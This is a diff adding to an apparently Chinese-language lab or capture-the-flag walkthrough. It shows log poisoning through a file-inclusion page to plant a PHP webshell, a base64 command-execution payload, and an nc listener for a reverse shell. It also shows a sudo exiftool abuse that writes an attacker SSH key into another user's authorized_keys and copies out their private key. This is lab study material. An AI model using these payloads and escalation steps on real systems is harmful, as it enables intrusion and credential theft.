@@ -79,3 +79,35 @@ PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7JGlwPScxOTIuMTY4LjQ0LjEyOCc7JHBvcnQ9OTAwMjskY2h1
 └─$ nc -lnvp  9002
 
 ```
+
+如果实战中出网，这个时候反弹shell的方法就没法用了。如果知道根目录的情况下我们可以尝试直接写入webshel​​l
+或者
+```c
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.18.238 80
+GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
+
+http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+
+http://192.168.1.226/a.php?c=whoami
+```
+
+# 提权
+```C
+sudo -l
+
+ (john : john) NOPASSWD: /usr/bin/exiftool
+
+```
+
+我们在/tmp/下创建一个id_rsa.pub，然后使用exiftool将“id rsa.pub”复制到“authorized_key”中
+```c
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD4JPtKD/rgJw5FoKhTno1xB+eAshDC4drsUKb/9pklPD+T9ngM8SXAHG0Pje5rWNaPkmUVSt00Pdaf1HOt20IhSwjigvibff891NjaVm6X+bL+PNGDYUjr10sB+co8VqONElfbcyGj27KxdwuxJczDzVpmyG3kGqtTeULNQRMR/32/I7TYQGJHN1tqq4U87e/P1f1P14yQ7fOFCPhcCXXTgESrIpxboT6os0KoFG4Q38y5FK7JykgFEphYck/znHluVp/ZE92mVXQVSHk6x9o98/VuJD8LC2jalu3oXddrZtafQCXf7SorOmy+8INjKDUK9zDRLXyKt8aIFQUuYkcaYpMo3Klybx3wdNL+8ui+wzcRjqyo2WbJmCFGtH06WsHZ8PZ+cvJry8AXBVUlGrhjX+1/rVgjak2QU+CpQaSUtozJlNMM8tGI7Pek2omUGcuTWRtxHgByvy5bwcCquSMXQt9sCXPK5RUSPE5PizSu56XDCzG4QvQHH3O6PiHyQhs= root@kali" > /tmp/id_rsa.pub
+
+sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
+```
+
+换一个思路读取ssh私钥
+```c
+sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa
+```
